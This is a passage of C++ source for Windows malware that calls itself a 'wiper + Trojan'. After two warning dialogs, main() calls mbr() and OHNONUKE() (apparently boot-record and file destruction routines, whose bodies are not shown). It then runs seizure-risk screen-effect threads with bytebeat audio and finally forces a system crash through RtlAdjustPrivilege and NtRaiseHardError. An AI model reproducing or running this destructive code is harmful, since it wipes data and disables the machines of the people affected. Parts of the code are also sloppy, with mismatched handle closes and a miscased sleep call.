	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound2() 
{
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t >> 1 & t >> 6 & 123) >> t / 5);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound3() 
{
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t >> t / 5 >> t+7);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound4() 
{
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t>>t/5);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound5() 
{
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t*((t&4096?t&59392?7:t>>6:16)+(1&t>>14))>>(3&-t>>(t<8?2:10))|t>>(t&163384?t&426?4:3:2)*rand());

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

int main()
{
	if (MessageBoxW(NULL, L"are you sure you want to run an wiper + Trojan?", L"dll.exe !NOT SAFETY!", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
	{
		ExitProcess(0);
	}
	else
	{
		if (MessageBoxW(NULL, L"This wiper + Trojan do flashing lights it may trigger seizures use at your own risk. dont even sue me i added 2 warnings to warn you", L"dll.exe - LAST WARNING", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
		{
			ExitProcess(0);
		}
	else
	
	mbr();
	
	OHNONUKE();
		
	HANDLE deaththreads = CreateThread(0, 0, msg, 0, 0, 0);
	
	HANDLE thread0 = CreateThread(0, 0, text, 0, 0, 0);
	
	HANDLE thread0dot1 = CreateThread(0, 0, tesseract, 0, 0, 0);
	
	
	sound0();
	
	Sleep(30000);
	
    TerminateThread(thread0dot1, NULL);
    CloseHandle(thread0dot1);
	
	
	HANDLE thread1 = CreateThread(0, 0, shader1, 0, 0, 0);
	
	HANDLE thread2 = CreateThread(0, 0, shaki, 0, 0, 0);
	
	sound1();
	
	Sleep(30000);
	
    TerminateThread(thread1, NULL);
    CloseHandle(thread1);
	InvalidateRect(0, 0, 0);
	
	HANDLE thread3 = CreateThread(0, 0, textout, 0, 0, 0);
	
	HANDLE thread4 = CreateThread(0, 0, mash, 0, 0, 0);
	
	HANDLE thread5 = CreateThread(0, 0, Shape, 0, 0, 0);
	
	HANDLE thread6 = CreateThread(0, 0, inv, 0, 0, 0);
	
	HANDLE thread7 = CreateThread(0, 0, gitchwithrand, 0, 0, 0);
	
	sound2();
	
	Sleep(30000);
	
    TerminateThread(thread4, NULL);
    CloseHandle(thread4);
    TerminateThread(thread6, NULL);
    CloseHandle(thread6);
    TerminateThread(thread7, NULL);
    CloseHandle(thread4);
    TerminateThread(thread5, NULL); 
    CloseHandle(thread6);
    
    HANDLE thread8 = CreateThread(0, 0, icon4d, 0, 0, 0);
       
    HANDLE thread9 = CreateThread(0, 0, circle, 0, 0, 0);
    
    sound3();
    
    Sleep(30000);
    
    TerminateThread(thread8, NULL);
    CloseHandle(thread8);
    
    HANDLE thread10 = CreateThread(0, 0, ball, 0, 0, 0);
    
    HANDLE thread11 = CreateThread(0, 0, Icons, 0, 0, 0);
    
    sound4();
    
    Sleep(30000);
    
    InvalidateRect(0, 0, 0);
    InvalidateRect(0, 0, 0);
    TerminateThread(thread10, NULL); 
    CloseHandle(thread10);
    TerminateThread(thread3, NULL);
    CloseHandle(thread3);
    TerminateThread(thread11, NULL);
    CloseHandle(thread11);
    TerminateThread(thread9, NULL);
    CloseHandle(thread9);
    TerminateThread(thread2, NULL);
    CloseHandle(thread2);

    HANDLE thread13 = CreateThread(0, 0, shader2, 0, 0, 0);
    
    HANDLE thread14 = CreateThread(0, 0, spin, 0, 0, 0);
    
    sound5();
    
    sleep(30000);
    
	BOOLEAN b;
	unsigned long response;
	RtlAdjustPrivilege(19, true, false, &b);
	NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);
	
}
}